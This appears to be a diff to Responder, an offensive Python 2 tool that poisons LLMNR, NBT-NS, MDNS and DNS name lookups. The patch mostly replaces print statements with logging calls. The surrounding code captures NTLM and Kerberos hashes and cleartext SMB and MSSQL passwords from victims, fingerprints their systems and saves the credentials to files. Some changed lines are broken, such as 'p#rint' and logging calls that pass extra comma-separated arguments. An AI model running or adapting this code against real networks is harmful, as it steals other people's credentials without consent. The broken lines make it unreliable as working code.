@@ -276,17 +276,19 @@ class NB(BaseRequestHandler):
                 if Is_Finger_On(Finger_On_Off):
                     try:
                         Finger = RunSmbFinger((self.client_address[0],445))
-                        Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s.\nOs Version is: %s Client Version is: %s"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]),Finger[0],Finger[1])
+                        Message = "%s [Analyze mode: NBT-NS] OS: %s Client Version: %s is looking for: %s Service requested is: %s"%(self.client_address[0], Finger[0], Finger[1], Name, NBT_NS_Role(data[43:46]))
                         logger3.warning(Message)
                     except Exception:
-                        Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s\n"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]))
+                        Message = "%s [Analyze mode: NBT-NS] is looking for : %s Service requested is: %s"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]))
                         logger3.warning(Message)
                     if PrintLLMNRNBTNS(AnalyzeFilename,Message):
-                        print Message
+                        #print Message
+                        logger3.warning(Message)
                 else:
-                    Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]))
+                    Message = "%s [Analyze mode: NBT-NS] is looking for : %s. Service requested is: %s"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]))
                     if PrintLLMNRNBTNS(AnalyzeFilename,Message):
-                        print Message
+                        #print Message
+                        logger3.warning(Message)
                     logger3.warning(Message)
 
         if RespondToSpecificHost(RespondTo) and Analyze(AnalyzeMode) == False:
@@ -302,17 +304,17 @@ class NB(BaseRequestHandler):
                                 Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
                                 logging.warning(Message)
                                 if PrintLLMNRNBTNS(Log2Filename,Message):
-                                    print Message
+                                    #print Message
                                     logger2.warning(Message)
                                 if Is_Finger_On(Finger_On_Off):
                                     try:
                                         Finger = RunSmbFinger((self.client_address[0],445))
-                                        print '[+] OsVersion is:%s'%(Finger[0])
-                                        print '[+] ClientVersion is :%s'%(Finger[1])
-                                        logging.warning('[+] OsVersion is:%s'%(Finger[0]))
-                                        logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                                        #print '[+] OsVersion is:%s'%(Finger[0])
+                                        #print '[+] ClientVersion is :%s'%(Finger[1])
+                                        logging.warning('OsVersion is:%s'%(Finger[0]))
+                                        logging.warning('ClientVersion is :%s'%(Finger[1]))
                                     except Exception:
-                                        logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                                        logging.warning('Fingerprint failed for host: %s'%(self.client_address[0]))
                                         pass
                         if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
                             DnsCache.getInstance().setCustomRes(Name.lower())
@@ -323,17 +325,17 @@ class NB(BaseRequestHandler):
                                 Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
                                 logging.warning(Message)
                                 if PrintLLMNRNBTNS(Log2Filename,Message):
-                                    print Message
+                                    #print Message
                                     logger2.warning(Message)
                                 if Is_Finger_On(Finger_On_Off):
                                     try:
                                         Finger = RunSmbFinger((self.client_address[0],445))
-                                        print '[+] OsVersion is:%s'%(Finger[0])
-                                        print '[+] ClientVersion is :%s'%(Finger[1])
-                                        logging.warning('[+] OsVersion is:%s'%(Finger[0]))
-                                        logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                                        #print '[+] OsVersion is:%s'%(Finger[0])
+                                        #print '[+] ClientVersion is :%s'%(Finger[1])
+                                        logging.warning('OsVersion is:%s'%(Finger[0]))
+                                        logging.warning('ClientVersion is :%s'%(Finger[1]))
                                     except Exception:
-                                        logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                                        logging.warning('Fingerprint failed for host: %s'%(self.client_address[0]))
                                         pass
                         else:
                             pass
@@ -352,17 +354,17 @@ class NB(BaseRequestHandler):
                         Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
                         logging.warning(Message)
                         if PrintLLMNRNBTNS(Log2Filename,Message):
-                            print Message
+                            #print Message
                             logger2.warning(Message)
                         if Is_Finger_On(Finger_On_Off):
                             try:
                                 Finger = RunSmbFinger((self.client_address[0],445))
-                                print '[+] OsVersion is:%s'%(Finger[0])
-                                print '[+] ClientVersion is :%s'%(Finger[1])
-                                logging.warning('[+] OsVersion is:%s'%(Finger[0]))
-                                logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                                #print '[+] OsVersion is:%s'%(Finger[0])
+                                p#rint '[+] ClientVersion is :%s'%(Finger[1])
+                                logging.warning('OsVersion is:%s'%(Finger[0]))
+                                logging.warning('ClientVersion is :%s'%(Finger[1]))
                             except Exception:
-                                logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                                logging.warning('Fingerprint failed for host: %s'%(self.client_address[0]))
                                 pass
                     if RespondToSpecificName(RespondToName) == False:
                         DnsCache.getInstance().setCustomRes(Name.lower())
@@ -373,17 +375,17 @@ class NB(BaseRequestHandler):
                         Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
                         logging.warning(Message)
                         if PrintLLMNRNBTNS(Log2Filename,Message):
-                            print Message
+                            #print Message
                             logger2.warning(Message)
                         if Is_Finger_On(Finger_On_Off):
                             try:
                                 Finger = RunSmbFinger((self.client_address[0],445))
-                                print '[+] OsVersion is:%s'%(Finger[0])
-                                print '[+] ClientVersion is :%s'%(Finger[1])
-                                logging.warning('[+] OsVersion is:%s'%(Finger[0]))
-                                logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                                #print '[+] OsVersion is:%s'%(Finger[0])
+                                #print '[+] ClientVersion is :%s'%(Finger[1])
+                                logging.warning('OsVersion is:%s'%(Finger[0]))
+                                logging.warning('ClientVersion is :%s'%(Finger[1]))
                             except Exception:
-                                logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                                logging.warning('Fingerprint failed for host: %s'%(self.client_address[0]))
                                 pass
                     else:
                         pass
@@ -443,17 +445,17 @@ def RAPThisDomain(Client,Domain):
             PDC = RapFinger(Client,Domain,"\x00\x00\x00\x80")
             if PDC is not None:
                 l.append('[Analyze mode LANMAN]:')
-                l.append('[!]Domain detected on this network:')
+                l.append('Domain detected on this network:')
                 for x in PDC:
                     l.append('   -'+x)
             SQL = RapFinger(Client,Domain,"\x04\x00\x00\x00")
             if SQL is not None:
-                l.append('[!]SQL Server detected on Domain %s:'%(Domain))
+                l.append('SQL Server detected on Domain %s:'%(Domain))
                 for x in SQL:
                     l.append('   -'+x)
             WKST = RapFinger(Client,Domain,"\xff\xff\xff\xff")
             if WKST is not None:
-                l.append('[!]Workstations/Servers detected on Domain %s:'%(Domain))
+                l.append('Workstations/Servers detected on Domain %s:'%(Domain))
                 for x in WKST:
                     l.append('   -'+x)
             else:
@@ -520,11 +522,12 @@ def BecomeBackup(data,Client):
             Role = NBT_NS_Role(data[45:48])
             Message = "[Analyze mode: Browser]Datagram Request from IP: %s hostname: %s via the: %s wants to become a Local Master Browser Backup on this domain: %s."%(Client, Name,Role,Domain)
             if PrintLLMNRNBTNS(AnalyzeFilename,Message):
-                print Message
+                #print Message
+                logger3.warning(Message)
             if AnalyzeMode:
                 Message1=RAPThisDomain(Client,Domain)
                 if PrintLLMNRNBTNS(AnalyzeFilename,Message1):
-                    print Message1
+                    #print Message1
                     logger3.warning(Message1)
             logger3.warning(Message)
     except:
@@ -539,11 +542,12 @@ def ParseDatagramNBTNames(data,Client):
         Message = '[Analyze mode: Browser]Datagram Request from IP: %s hostname: %s via the: %s to: %s. Service: %s'%(Client, Name, Role1, Domain, Role2)
         if Role2 == "Domain controller service. This name is a domain controller." or Role2 == "Browser Election Service." or Role2 == "Local Master Browser.":
             if PrintLLMNRNBTNS(AnalyzeFilename,Message):
-                print Message
+                #print Message
+                logger3.warning(Message)
             if AnalyzeMode:
                 Message1=RAPThisDomain(Client,Domain)
                 if PrintLLMNRNBTNS(AnalyzeFilename,Message1):
-                    print Message1
+                    #print Message1
                     logger3.warning(Message1)
             logger3.warning(Message)
     except:
@@ -657,10 +661,10 @@ def ParseSMBHash(data,client):
         writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
         outfile = os.path.join(ResponderPATH,"SMB-NTLMv1ESS-Client-"+client+".txt")
         if PrintData(outfile,User+"::"+Domain):
-            print "[+]SMB-NTLMv1 hash captured from : ",client
-            print "[+]SMB complete hash is :", writehash
+            logging.warning("SMB-NTLMv1 hash captured from : ",client)
+            logging.warning("SMB complete hash is :", writehash)
             WriteData(outfile,writehash,User+"::"+Domain)
-        logging.warning('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
+        logging.warning('SMB-NTLMv1 complete hash is :%s'%(writehash))
 
     if NthashLen > 60:
         outfile = os.path.join(ResponderPATH,"SMB-NTLMv2-Client-"+client+".txt")
@@ -673,10 +677,10 @@ def ParseSMBHash(data,client):
         User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
         writehash = User+"::"+Domain+":"+NumChal+":"+NtHash[:32]+":"+NtHash[32:]
         if PrintData(outfile,User+"::"+Domain):
-            print "[+]SMB-NTLMv2 hash captured from : ",client
-            print "[+]SMB complete hash is :", writehash
+            logging.warning("SMB-NTLMv2 hash captured from : ",client)
+            logging.warning("SMB complete hash is :", writehash)
             WriteData(outfile,writehash,User+"::"+Domain)
-        logging.warning('[+]SMB-NTLMv2 complete hash is :%s'%(writehash))
+        logging.warning('SMB-NTLMv2 complete hash is :%s'%(writehash))
 
 #Parse SMB NTLMv1/v2
 def ParseLMNTHash(data,client):
@@ -687,33 +691,33 @@ def ParseLMNTHash(data,client):
         Bcc = struct.unpack('<H',data[63:65])[0]
         if NthashLen > 25:
             Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
-            logging.warning('[+]SMB-NTLMv2 hash captured from :%s'%(client))
+            logging.warning('SMB-NTLMv2 hash captured from :%s'%(client))
             outfile = os.path.join(ResponderPATH,"SMB-NTLMv2-Client-"+client+".txt")
             pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
             var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
             Username, Domain = tuple(var)
             Writehash = Username+"::"+Domain+":"+NumChal+":"+Hash.encode('hex')[:32].upper()+":"+Hash.encode('hex')[32:].upper()
             if PrintData(outfile,Username+"::"+Domain):
-                print "[+]SMB-NTLMv2 hash captured from :",client
-                print "[+]SMB-NTLMv2 complete hash is :",Writehash
+                logging.warning("SMB-NTLMv2 hash captured from :",client)
+                logging.warning("SMB-NTLMv2 complete hash is :",Writehash)
                 ParseShare(data)
                 WriteData(outfile,Writehash, Username+"::"+Domain)
-            logging.warning('[+]SMB-NTLMv2 complete hash is :%s'%(Writehash))
+            logging.warning('SMB-NTLMv2 complete hash is :%s'%(Writehash))
         if NthashLen == 24:
-            logging.warning('[+]SMB-NTLMv1 hash captured from :%s'%(client))
+            logging.warning('SMB-NTLMv1 hash captured from :%s'%(client))
             outfile = os.path.join(ResponderPATH,"SMB-NTLMv1-Client-"+client+".txt")
             pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
             var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
             Username, Domain = tuple(var)
             writehash = Username+"::"+Domain+":"+data[65:65+LMhashLen].encode('hex').upper()+":"+data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()+":"+NumChal
             if PrintData(outfile,Username+"::"+Domain):
-                print "[+]SMB-NTLMv1 hash captured from : ",client
-                print "[+]SMB complete hash is :", writehash
+                logging.warning("SMB-NTLMv1 hash captured from : ",client)
+                logging.warning("SMB complete hash is :", writehash)
                 ParseShare(data)
                 WriteData(outfile,writehash, Username+"::"+Domain)
-            logging.warning('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
-            logging.warning('[+]SMB-NTLMv1 Username:%s'%(Username))
-            logging.warning('[+]SMB-NTLMv1 Domain (if joined, if not then computer name) :%s'%(Domain))
+            logging.warning('SMB-NTLMv1 complete hash is :%s'%(writehash))
+            logging.warning('SMB-NTLMv1 Username:%s'%(Username))
+            logging.warning('SMB-NTLMv1 Domain (if joined, if not then computer name) :%s'%(Domain))
     except Exception:
         raise
 
@@ -729,7 +733,7 @@ def IsNT4ClearTxt(data):
             if PassLen > 2:
                 Password = data[HeadLen+30:HeadLen+30+PassLen].replace("\x00","")
                 User = ''.join(tuple(data[HeadLen+30+PassLen:].split('\x00\x00\x00'))[:1]).replace("\x00","")
-                print "[SMB]Clear Text Credentials: %s:%s" %(User,Password)
+                #print "[SMB]Clear Text Credentials: %s:%s" %(User,Password)
                 logging.warning("[SMB]Clear Text Credentials: %s:%s"%(User,Password))
 
 #SMB Server class, NTLMSSP
@@ -970,11 +974,11 @@ class KerbTCP(BaseRequestHandler):
             if KerbHash:
                 Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
                 if PrintData(Outfile,KerbHash):
-                    print "[+]MSKerbv5 hash captured from : ", self.client_address[0]
-                    print "[+]MSKerbv5 complete hash is :", KerbHash
+                    logging.warning("MSKerbv5 hash captured from : ", self.client_address[0])
+                    #print "[+]MSKerbv5 complete hash is :", KerbHash
                     Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
                     WriteData(Outfile,KerbHash, KerbHash)
-                    logging.warning('[+]MSKerbv5 complete hash is :%s'%(KerbHash))
+                    logging.warning('MSKerbv5 complete hash is :%s'%(KerbHash))
         except Exception:
             raise
 
@@ -987,11 +991,11 @@ class KerbUDP(BaseRequestHandler):
             if KerbHash:
                 Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
                 if PrintData(Outfile,KerbHash):
-                    print "[+]MSKerbv5 hash captured from : ", self.client_address[0]
-                    print "[+]MSKerbv5 complete hash is :", KerbHash
+                    logging.warning("MSKerbv5 hash captured from : ", self.client_address[0])
+                    #print "[+]MSKerbv5 complete hash is :", KerbHash
                     Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
                     WriteData(Outfile,KerbHash, KerbHash)
-                    logging.warning('[+]MSKerbv5 complete hash is :%s'%(KerbHash))
+                    logging.warning('MSKerbv5 complete hash is :%s'%(KerbHash))
         except Exception:
             raise
 
@@ -1018,13 +1022,13 @@ def ParseSQLHash(data,client):
         User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
         outfile = os.path.join(ResponderPATH,"MSSQL-NTLMv1-Client-"+client+".txt")
         if PrintData(outfile,User+"::"+Domain):
-            print "[+]MSSQL NTLMv1 hash captured from :",client
-            print '[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal)
+            logging.warning("MSSQL NTLMv1 hash captured from :",client)
+            logging.warning('MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal))
             WriteData(outfile,User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal, User+"::"+Domain)
-        logging.warning('[+]MsSQL NTLMv1 hash captured from :%s'%(client))
-        logging.warning('[+]MSSQL NTLMv1 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
-        logging.warning('[+]MSSQL NTLMv1 Domain is :%s'%(Domain))
-        logging.warning('[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal))
+        logging.warning('MsSQL NTLMv1 hash captured from :%s'%(client))
+        logging.warning('MSSQL NTLMv1 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
+        logging.warning('MSSQL NTLMv1 Domain is :%s'%(Domain))
+        logging.warning('MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal))
     if NthashLen > 60:
         DomainLen = struct.unpack('<H',data[36:38])[0]
         NthashOffset = struct.unpack('<H',data[32:34])[0]
@@ -1038,13 +1042,13 @@ def ParseSQLHash(data,client):
         outfile = os.path.join(ResponderPATH,"MSSQL-NTLMv2-Client-"+client+".txt")
         Writehash = User+"::"+Domain+":"+NumChal+":"+Hash[:32].upper()+":"+Hash[32:].upper()
         if PrintData(outfile,User+"::"+Domain):
-            print "[+]MSSQL NTLMv2 Hash captured from :",client
-            print "[+]MSSQL NTLMv2 Complete Hash is : ", Writehash
+            logging.warning("MSSQL NTLMv2 Hash captured from :",client)
+            logging.warning("MSSQL NTLMv2 Complete Hash is : ", Writehash)
             WriteData(outfile,Writehash,User+"::"+Domain)
-        logging.warning('[+]MsSQL NTLMv2 hash captured from :%s'%(client))
-        logging.warning('[+]MSSQL NTLMv2 Domain is :%s'%(Domain))
-        logging.warning('[+]MSSQL NTLMv2 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
-        logging.warning('[+]MSSQL NTLMv2 Complete Hash is : %s'%(Writehash))
+        logging.warning('MsSQL NTLMv2 hash captured from :%s'%(client))
+        logging.warning('MSSQL NTLMv2 Domain is :%s'%(Domain))
+        logging.warning('MSSQL NTLMv2 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
+        logging.warning('MSSQL NTLMv2 Complete Hash is : %s'%(Writehash))
 
 def ParseSqlClearTxtPwd(Pwd):
     Pwd = map(ord,Pwd.replace('\xa5',''))
@@ -1063,11 +1067,11 @@ def ParseClearTextSQLPass(Data,client):
     PwdStr = ParseSqlClearTxtPwd(Data[8+PwdOffset:8+PwdOffset+PwdLen])
     UserName = Data[8+UsernameOffset:8+UsernameOffset+UsernameLen].decode('utf-16le')
     if PrintData(outfile,UserName+":"+PwdStr):
-        print "[+]MSSQL PlainText Password captured from :",client
-        print "[+]MSSQL Username: %s Password: %s"%(UserName, PwdStr)
+        logging.warning("MSSQL PlainText Password captured from :",client)
+        logging.warning("MSSQL Username: %s Password: %s"%(UserName, PwdStr))
         WriteData(outfile,UserName+":"+PwdStr,UserName+":"+PwdStr)
-    logging.warning('[+]MSSQL PlainText Password captured from :%s'%(client))
-    logging.warning('[+]MSSQL Username: %s Password: %s'%(UserName, PwdStr))
+    logging.warning('MSSQL PlainText Password captured from :%s'%(client))
+    logging.warning('MSSQL Username: %s Password: %s'%(UserName, PwdStr))
 
 
 def ParsePreLoginEncValue(Data):
@@ -1175,7 +1179,7 @@ def IsICMPRedirectPlausible(IP):
             dnsip.extend(ip[1:])
     for x in dnsip:
         if x !="127.0.0.1" and IsOnTheSameSubnet(x,IP) == False:
-            print "[Analyze mode: ICMP] You can ICMP Redirect on this network. This workstation (%s) is not on the same subnet than the DNS server (%s). Use python Icmp-Redirect.py for more details."%(IP, x)
+            print "|  |_ [Analyze mode: ICMP] You can ICMP Redirect on this network. This workstation (%s) is not on the same subnet than the DNS server (%s). Use python Icmp-Redirect.py for more details."%(IP, x)
         else:
             pass
 
@@ -1204,17 +1208,16 @@ class LLMNR(BaseRequestHandler):
                         if Is_Finger_On(Finger_On_Off):
                             try:
                                 Finger = RunSmbFinger((self.client_address[0],445))
-                                Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s.\nOs Version is: %s Client Version is: %s"%(self.client_address[0], Name,Finger[0],Finger[1])
+                                Message = "%s [Analyze mode: LLMNR] OS: %s Client Version: %s is looking for : %s"%(self.client_address[0],Finger[0],Finger[1],Name)
                                 logger3.warning(Message)
                             except Exception:
-                                Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(self.client_address[0], Name)
+                                Message = "%s [Analyze mode: LLMNR] is looking for : %s."%(self.client_address[0], Name)
                                 logger3.warning(Message)
                                 if PrintLLMNRNBTNS(AnalyzeFilename,Message):
-                                    print Message
+                                    logger3.warning(Message)
                         else:
                             Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(self.client_address[0], Name)
                             if PrintLLMNRNBTNS(AnalyzeFilename,Message):
-                                print Message
                                 logger3.warning(Message)
 
                     if DontRespondToSpecificHost(DontRespondTo):
@@ -1235,17 +1238,17 @@ class LLMNR(BaseRequestHandler):
                                         Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
                                         logging.warning(Message)
                                         if PrintLLMNRNBTNS(Log2Filename,Message):
-                                            print Message
+                                            #print Message
                                             logger2.warning(Message)
                                         if Is_Finger_On(Finger_On_Off):
                                             try:
                                                 Finger = RunSmbFinger((self.client_address[0],445))
-                                                print '[+] OsVersion is:%s'%(Finger[0])
-                                                print '[+] ClientVersion is :%s'%(Finger[1])
-                                                logging.warning('[+] OsVersion is:%s'%(Finger[0]))
-                                                logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                                                #print '[+] OsVersion is:%s'%(Finger[0])
+                                                #print '[+] ClientVersion is :%s'%(Finger[1])
+                                                logging.warning('OsVersion is:%s'%(Finger[0]))
+                                                logging.warning('ClientVersion is :%s'%(Finger[1]))
                                             except Exception:
-                                                logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                                                logging.warning('Fingerprint failed for host: %s'%(self.client_address[0]))
                                                 pass
 
                                 if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
@@ -1256,17 +1259,17 @@ class LLMNR(BaseRequestHandler):
                                         Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
                                         logging.warning(Message)
                                         if PrintLLMNRNBTNS(Log2Filename,Message):
-                                            print Message
+                                            #print Message
                                             logger2.warning(Message)
                                         if Is_Finger_On(Finger_On_Off):
                                             try:
                                                 Finger = RunSmbFinger((self.client_address[0],445))
-                                                print '[+] OsVersion is:%s'%(Finger[0])
-                                                print '[+] ClientVersion is :%s'%(Finger[1])
-                                                logging.warning('[+] OsVersion is:%s'%(Finger[0]))
-                                                logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                                                #print '[+] OsVersion is:%s'%(Finger[0])
+                                                #print '[+] ClientVersion is :%s'%(Finger[1])
+                                                logging.warning('OsVersion is:%s'%(Finger[0]))
+                                                logging.warning('ClientVersion is :%s'%(Finger[1]))
                                             except Exception:
-                                                logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                                                logging.warning('Fingerprint failed for host: %s'%(self.client_address[0]))
                                                 pass
 
                     if Analyze(AnalyzeMode) == False and RespondToSpecificHost(RespondTo) == False:
@@ -1277,17 +1280,17 @@ class LLMNR(BaseRequestHandler):
                             for x in range(1):
                                 soc.sendto(str(buff), self.client_address)
                             if PrintLLMNRNBTNS(Log2Filename,Message):
-                                print Message
+                                #print Message
                                 logger2.warning(Message)
                             if Is_Finger_On(Finger_On_Off):
                                 try:
                                     Finger = RunSmbFinger((self.client_address[0],445))
-                                    print '[+] OsVersion is:%s'%(Finger[0])
-                                    print '[+] ClientVersion is :%s'%(Finger[1])
-                                    logging.warning('[+] OsVersion is:%s'%(Finger[0]))
-                                    logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                                    #print '[+] OsVersion is:%s'%(Finger[0])
+                                    #print '[+] ClientVersion is :%s'%(Finger[1])
+                                    logging.warning('OsVersion is:%s'%(Finger[0]))
+                                    logging.warning('ClientVersion is :%s'%(Finger[1]))
                                 except Exception:
-                                    logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                                    logging.warning('Fingerprint failed for host: %s'%(self.client_address[0]))
                                     pass
                         if RespondToSpecificName(RespondToName) == False:
                              buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
@@ -1296,17 +1299,17 @@ class LLMNR(BaseRequestHandler):
                              for x in range(1):
                                  soc.sendto(str(buff), self.client_address)
                              if PrintLLMNRNBTNS(Log2Filename,Message):
-                                 print Message
+                                 #print Message
                                  logger2.warning(Message)
                              if Is_Finger_On(Finger_On_Off):
                                  try:
                                      Finger = RunSmbFinger((self.client_address[0],445))
-                                     print '[+] OsVersion is:%s'%(Finger[0])
-                                     print '[+] ClientVersion is :%s'%(Finger[1])
-                                     logging.warning('[+] OsVersion is:%s'%(Finger[0]))
-                                     logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                                     #print '[+] OsVersion is:%s'%(Finger[0])
+                                     #print '[+] ClientVersion is :%s'%(Finger[1])
+                                     logging.warning('OsVersion is:%s'%(Finger[0]))
+                                     logging.warning('ClientVersion is :%s'%(Finger[1]))
                                  except Exception:
-                                     logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                                     logging.warning('Fingerprint failed for host: %s'%(self.client_address[0]))
                                      pass
                         else:
                             pass
@@ -1363,7 +1366,7 @@ class DNS(BaseRequestHandler):
             buff = DNSAns()
             buff.calculate(data)
             soc.sendto(str(buff), self.client_address)
-            print "DNS Answer sent to: %s "%(self.client_address[0])
+            #print "DNS Answer sent to: %s "%(self.client_address[0])
             logging.warning('DNS Answer sent to: %s'%(self.client_address[0]))
 
 class DNSTCP(BaseRequestHandler):
@@ -1377,7 +1380,7 @@ class DNSTCP(BaseRequestHandler):
                 buff = DNSAns()
                 buff.calculate(data)
                 self.request.send(str(buff))
-                print "DNS Answer sent to: %s "%(self.client_address[0])
+                #print "DNS Answer sent to: %s "%(self.client_address[0])
                 logging.warning('DNS Answer sent to: %s'%(self.client_address[0]))
 
         except Exception:
@@ -1432,14 +1435,14 @@ class MDNS(BaseRequestHandler):
         try:
             if Analyze(AnalyzeMode):
                 if Parse_IPV6_Addr(data):
-                    print '[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data))
+                    #print '[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data))
                     logging.warning('[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
 
             if RespondToSpecificHost(RespondTo):
                 if Analyze(AnalyzeMode) == False:
                     if RespondToIPScope(RespondTo, self.client_address[0]):
                         if Parse_IPV6_Addr(data):
-                            print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
+                            #print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
                             logging.warning('MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
                             Name = Poisoned_MDNS_Name(data)
                             MDns = MDNSAns(AnswerName = Name)
@@ -1448,7 +1451,7 @@ class MDNS(BaseRequestHandler):
 
             if Analyze(AnalyzeMode) == False and RespondToSpecificHost(RespondTo) == False:
                 if Parse_IPV6_Addr(data):
-                    print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
+                    #print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
                     logging.warning('MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
                     Name = Poisoned_MDNS_Name(data)
                     MDns = MDNSAns(AnswerName = Name)
@@ -1484,14 +1487,14 @@ def ParseHTTPHash(data,client):
         outfile = os.path.join(ResponderPATH,"HTTP-NTLMv1-Client-"+client+".txt")
         WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
         if PrintData(outfile,User+"::"+Hostname):
-            print "[+]HTTP NTLMv1 hash captured from :",client
-            print "Hostname is :", Hostname
-            print "Complete hash is : ", WriteHash
+            #print "[+]HTTP NTLMv1 hash captured from :",client
+            #print "Hostname is :", Hostname
+            #print "Complete hash is : ", WriteHash
             WriteData(outfile,WriteHash, User+"::"+Hostname)
-        logging.warning('[+]HTTP NTLMv1 hash captured from :%s'%(client))
-        logging.warning('[+]HTTP NTLMv1 Hostname is :%s'%(Hostname))
-        logging.warning('[+]HTTP NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
-        logging.warning('[+]HTTP NTLMv1 Complete hash is :%s'%(WriteHash))
+        logging.warning('HTTP NTLMv1 hash captured from :%s'%(client))
+        logging.warning('HTTP NTLMv1 Hostname is :%s'%(Hostname))
+        logging.warning('HTTP NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
+        logging.warning('HTTP NTLMv1 Complete hash is :%s'%(WriteHash))
 
     if NthashLen > 24:
         NthashLen = 64
@@ -1507,19 +1510,19 @@ def ParseHTTPHash(data,client):
         outfile = os.path.join(ResponderPATH,"HTTP-NTLMv2-Client-"+client+".txt")
         WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
         if PrintData(outfile,User+"::"+Domain):
-            print "[+]HTTP NTLMv2 hash captured from :",client
-            print "Complete hash is : ", WriteHash
+            logging.warning("HTTP NTLMv2 hash captured from :",client)
+            logging.warning("Complete hash is : ", WriteHash)
             WriteData(outfile,WriteHash, User+"::"+Domain)
-        logging.warning('[+]HTTP NTLMv2 hash captured from :%s'%(client))
-        logging.warning('[+]HTTP NTLMv2 User is : %s'%(User))
-        logging.warning('[+]HTTP NTLMv2 Domain is :%s'%(Domain))
-        logging.warning('[+]HTTP NTLMv2 Hostname is :%s'%(HostName))
-        logging.warning('[+]HTTP NTLMv2 Complete hash is :%s'%(WriteHash))
+        logging.warning('HTTP NTLMv2 hash captured from :%s'%(client))
+        logging.warning('HTTP NTLMv2 User is : %s'%(User))
+        logging.warning('HTTP NTLMv2 Domain is :%s'%(Domain))
+        logging.warning('HTTP NTLMv2 Hostname is :%s'%(HostName))
